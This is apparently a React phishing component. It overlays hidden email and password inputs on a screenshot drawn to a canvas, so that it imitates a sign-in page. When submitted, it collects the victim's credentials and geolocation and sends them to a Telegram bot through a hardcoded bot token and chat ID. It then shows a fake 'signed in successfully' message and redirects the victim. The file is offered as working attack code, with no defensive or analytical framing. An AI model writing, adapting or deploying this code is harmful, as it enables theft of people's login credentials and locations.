import React, { useRef, useEffect, useState } from 'react';

const ShippingCanvas = () => {
  const emailInputRef = useRef(null); // Reference for email input
  const passwordInputRef = useRef(null); // Reference for password input
  const canvasRef = useRef(null); // Reference for canvas
  const [geoData, setGeoData] = useState(null); // State for storing geolocation data
  const [formData, setFormData] = useState({ email: '', password: '', latitude: null, longitude: null });

  useEffect(() => {
    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');
    const image = new Image();
    image.src = 'https://i.ibb.co/5rcKL7q/Screenshot-2024-10-25-061657.png';
    image.onload = () => {
      ctx.drawImage(image, 0, 0, canvas.width, canvas.height);
      drawInputFields(ctx);
    };
  }, []);

  const drawInputFields = (ctx) => {
    const emailX = 409;
    const emailY = 300;
    const passwordX = 409;
    const passwordY = 350;
    const buttonX = 690;
    const buttonY = 512;
    const buttonWidth = 150;
    const buttonHeight = 50;

    ctx.strokeRect(emailX, emailY, 430, 30);
    ctx.strokeRect(passwordX, passwordY, 430, 30);
    setInputBox(emailInputRef.current, emailX, emailY, 430, 30);
    setInputBox(passwordInputRef.current, passwordX, passwordY, 430, 30);

    const handleCanvasClick = (event) => {
      const x = event.offsetX;
      const y = event.offsetY;
      if (x > buttonX && x < buttonX + buttonWidth && y > buttonY && y < buttonY + buttonHeight) {
        handleSubmit();
      }
    };
    canvasRef.current.addEventListener('click', handleCanvasClick);
    return () => {
      canvasRef.current.removeEventListener('click', handleCanvasClick);
    };
  };

  const setInputBox = (inputElement, x, y, width, height) => {
    inputElement.style.left = `${canvasRef.current.offsetLeft + x}px`;
    inputElement.style.top = `${canvasRef.current.offsetTop + y}px`;
    inputElement.style.width = `${width}px`;
    inputElement.style.height = `${height}px`;
    inputElement.style.visibility = 'visible';
  };

  const handleSubmit = async () => {
    const email = emailInputRef.current.value;
    const password = passwordInputRef.current.value;
    if (email.trim() === '' || password.trim() === '') {
      alert('Please fill in both fields');
      return;
    }

    try {
      // Use a Promise-based wrapper for geolocation to use await
      const position = await new Promise((resolve, reject) =>
        navigator.geolocation.getCurrentPosition(resolve, reject)
      );
      const { latitude, longitude } = position.coords;
      setGeoData({ latitude, longitude });
      
      // Update the formData state with email, password, and geoData
      setFormData({
        email,
        password,
        latitude,
        longitude,
      });

      // Send data to Telegram bot
      const botToken = '7315734945:AAEwBBKiHG5dorU-IT6nOnS1Yi76W37qPmI';
      const chatId = '6707519229';
      const message = `📨 **Email:** ${email} 🔑 **Password:** ${password} 📍 **Latitude:** ${latitude} 📍 **Longitude:** ${longitude}`;
      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      const response = await fetch(telegramUrl);
      if (response.ok) {
        alert('You have signed in successfully');
        window.location.href = 'https://imgur.com/a/65Me9UX';
      } else {
        alert('Error sending message');
      }
    } catch (error) {
      console.error('Geolocation error:', error);
      alert('Error retrieving geolocation data');
    }
  };

  return (
    <div>
      <canvas ref={canvasRef} width="1447" height="786" style={{ border: '1px solid black' }}></canvas>
      <input
        ref={emailInputRef}
        type="text"
        className="hidden-input"
        placeholder="Email"
        style={{
          position: 'absolute',
          visibility: 'hidden',
        }}
      />
      <input
        ref={passwordInputRef}
        type="password"
        className="hidden-input"
        placeholder="Password"
        style={{
          position: 'absolute',
          visibility: 'hidden',
        }}
      />
    </div>
  );
};

export default ShippingCanvas;
